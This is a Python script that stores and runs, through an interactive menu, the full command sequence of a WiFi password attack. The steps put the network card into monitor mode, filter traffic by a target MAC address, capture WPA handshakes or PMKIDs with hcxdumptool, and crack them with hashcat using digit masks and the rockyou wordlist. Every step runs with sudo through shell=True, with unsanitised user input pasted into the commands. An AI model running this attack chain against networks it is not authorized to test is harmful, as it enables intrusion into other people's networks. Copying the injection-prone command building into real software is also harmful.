import json
import os
import subprocess

class JSONDatabase:
    def __init__(self, file_path, session_name, interface, macaddress, channel, is_2GHz4):
        self.file_path = file_path
        self.session_name = session_name
        self.interface = interface
        self.macaddress = macaddress    # e.g 18CF24852084                 
        self.channel = channel
        self.is_2GHz4 = is_2GHz4
        if not os.path.exists(self.file_path):
            self._create_empty_db()
        

    def _create_empty_db(self):
        with open(self.file_path, 'w') as db_file:
            json.dump([], db_file)

    def _read_db(self):
        with open(self.file_path, 'r') as db_file:
            return json.load(db_file)

    def _write_db(self, data):
        with open(self.file_path, 'w') as db_file:
            json.dump(data, db_file, indent=4)

    def create(self, element):
        data = self._read_db()
        if element in data:
            print("Element already exists in the database.")
            return
        data.append(element)
        self._write_db(data)

    def read(self, index):
        data = self._read_db()
        if 0 <= index < len(data):
            return data[index]
        else:
            raise IndexError("Index out of range")

    def update(self, index, new_element):
        data = self._read_db()
        if 0 <= index < len(data):
            data[index] = new_element
            self._write_db(data)
        else:
            raise IndexError("Index out of range")

    def delete(self, index):
        data = self._read_db()
        if 0 <= index < len(data):
            data.pop(index)
            self._write_db(data)
        else:
            raise IndexError("Index out of range")

    def list_all(self):
        return self._read_db()

    # This function will create a template for the database.
    # But the best way is to use the load_template function to load a template from a file.
    def sync(self):  
        self.create(
            {
            "step": 0,
            "name": "Configure session",
            "commands": [
                "file_path",
                "session_name",
                "interface",
                "macaddress",
                "channel",
                "is_2GHz4"
            ]
            }
        )
        self.create(
            {
            "step": 1,
            "name": "Restart managing service",
            "commands": [
                "sudo systemctl start NetworkManager.service",
                "sudo systemctl start wpa_supplicant.service"
            ]
            }
        )
        self.create(
            {
            "step": 2,
            "name": "Stop managing service",
            "commands": [
                "sudo systemctl stop NetworkManager.service",
                "sudo systemctl stop wpa_supplicant.service"
            ]
            }
        )
        self.create(
            {
            "step": 3,
            "name": "Put NIC into monitor mode",
            "commands": [
                f"sudo airmon-ng start {self.interface}"
            ]
            }
        )
        self.create(
            {
            "step": 4,
            "name": "Scan for networks",
            "commands": [
                f"sudo airodump-ng {self.interface}"
            ]
            }
        )
        self.create(
            {
            "step": 5,
            "name": "Create a BPF filter",
            "commands": [
                f"sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3 {self.macaddress} or wlan addr3 ffffffffffff' -ddd > {self.session_name}_attack.bpf"
            ]
            }
        )
        temp = ""
        if self.is_2GHz4:
            temp = f"{self.channel}a"
        else:
            temp = f"{self.channel}"
        self.create(
            {
            "step": 6,
            "name": "Start packet capture",
            "commands": [
                f"sudo hcxdumptool -i {self.interface} -c {temp} --bpf={self.session_name}_attack.bpf -w {self.session_name}_capture.pcapng",
                f"sudo tcpdump -U -s 0 -i {self.interface} -w {self.session_name}_capture.pcap -l -n -e -vv -r {self.session_name}_attack.bpf"
            ]
            }
        )
        self.create(
            {
            "step": 7,
            "name": "Convert captured packets to hashcat format",
            "commands": [
                f"sudo hcxpcaptool -o {self.session_name}_hash.hc22000 {self.session_name}_capture.pcapng",
                f"sudo hcxpcaptool -z {self.session_name}_hash.16800 {self.session_name}_capture.pcapng"
            ]
            }
        )
        self.create(
            {
            "step": 8,
            "name": "Crack captured hashes",
            "commands": [
                f"hashcat.exe {self.session_name}_hash.hc22000 -a 3 -m 22000 -i --increment-min=8 --increment-max=12 ?d?d?d?d?d?d?d?d?d?d?d?d --session=1",
                f"sudo hashcat -m 22000 {self.session_name}_hash.hc22000 %d%d%d%d%d%d%d%d%d%d -a 3 --force",
                f"sudo hashcat -m 16800 {self.session_name}_hash.16800 /usr/share/wordlists/rockyou.txt"
            ]
            }
        )
        self.create(
            {
            "step": 9,
            "name": "Scan interfaces",
            "commands": [
                "sudo iw dev",
                "iwconfig",
                "sudo airmon-ng",
                "sudo airmon-ng check kill",
            ]
            }
        )
        self.create(
            {
            "step": 10,
            "name": "Fix hcxdumptool error",
            "commands": [
                "sudo apt-get update",
                "sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev",
                "git clone https://github.com/ZerBea/hcxtools.git",
                "cd hcxtools",
                "sudo make && sudo make install",
                "cd ..",
                "git clone https://github.com/Zerbea/hcxdumptool.git",
                "cd hcxdumptool",
                "sudo make && sudo make install",
                "which hcxdumptool"
            ]
            }
        )

    # This function will not be used for now, but it is a good example of how to create a template
    def load_template(self, template_path):
        if not os.path.exists(template_path):
            raise FileNotFoundError(f"Template file {template_path} does not exist.")
        
        if not os.path.exists(template_path):
            self._create_empty_db()
        else:
            self.flush()
        
        with open(template_path, 'r') as template_file:
            template_data = json.load(template_file)

        template_data.sort(key=lambda x: x['step'])
        
        for element in template_data:
            self.create(element)

    def flush(self):
        self._create_empty_db()

    def run_command(self, command):
        try:
            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return result.stdout.decode('utf-8')
        except subprocess.CalledProcessError as e:
            return e.stderr.decode('utf-8')

    def menu_loop(self):
        while True:
            os.system('clear' if os.name == 'posix' else 'cls')
            data = self._read_db()
            data.sort(key=lambda x: x['step'])
            for item in data:
                print(f"{item['step']}: {item['name']}")
            choice = input("Enter the step number to execute or 'q' to quit: ")
            if choice.lower() == 'q':
                break
            if choice == '0':
                while True:
                    os.system('clear' if os.name == 'posix' else 'cls')
                    print(f"0. Session name: {self.session_name}")
                    print(f"1. Interface: {self.interface}")
                    print(f"2. MAC address: {self.macaddress}")
                    print(f"3. Channel: {self.channel}")
                    print(f"4. Is it 2.4GHz?: {self.is_2GHz4}")
                    print("b: Back to main menu")
                    config_choice = input("Select the element to configure: ")
                    if config_choice == '0':
                        self.session_name = input("Enter session name: ")
                        self.flush()
                        self.sync()
                    elif config_choice == '1':
                        self.interface = input("Enter interface: ")
                        self.flush()
                        self.sync()
                    elif config_choice == '2':
                        self.macaddress = input("Enter MAC address: ")
                        self.flush()
                        self.sync()
                    elif config_choice == '3':
                        self.channel = input("Enter channel: ")
                        self.flush()
                        self.sync()
                    elif config_choice == '4':
                        self.is_2GHz4 = input("Is it 2.4GHz? (True/False): ").lower() == 'true'
                        self.flush()
                        self.sync()
                    elif config_choice.lower() == 'b':
                        break
                    else:
                        print("Invalid choice.")
                    input("Press Enter to continue...")
                continue
            try:
                os.system('clear' if os.name == 'posix' else 'cls')
                step = int(choice)
                commands = next(item['commands'] for item in data if item['step'] == step)
                for i, command in enumerate(commands):
                    print(f"{i}: {command}")
                cmd_choice = input("Enter the command number to execute or 'b' to go back: ")
                if cmd_choice.lower() == 'b':
                    continue
                try:
                    cmd_index = int(cmd_choice)
                    if 0 <= cmd_index < len(commands):
                        print(f"Executing: {commands[cmd_index]}")
                        output = self.run_command(commands[cmd_index])
                        print(output)
                    else:
                        print("Invalid command number.")
                except ValueError:
                    print("Invalid input.")
            except (ValueError, StopIteration) as e:
                print(f"Invalid choice: {e}")
            input("Press Enter to continue...")


db = JSONDatabase(
    file_path='new.json',
    session_name='TestWiFi',
    interface='wlan0',
    macaddress='aabbccddeeff',
    channel='1',
    is_2GHz4=True
)
db.flush() # Clear the database
db.sync() # Sync the database with the default values
#print(db.run_command("ls"))
#db.load_template("config.dist.json")
db.menu_loop()
#print(config.list_all())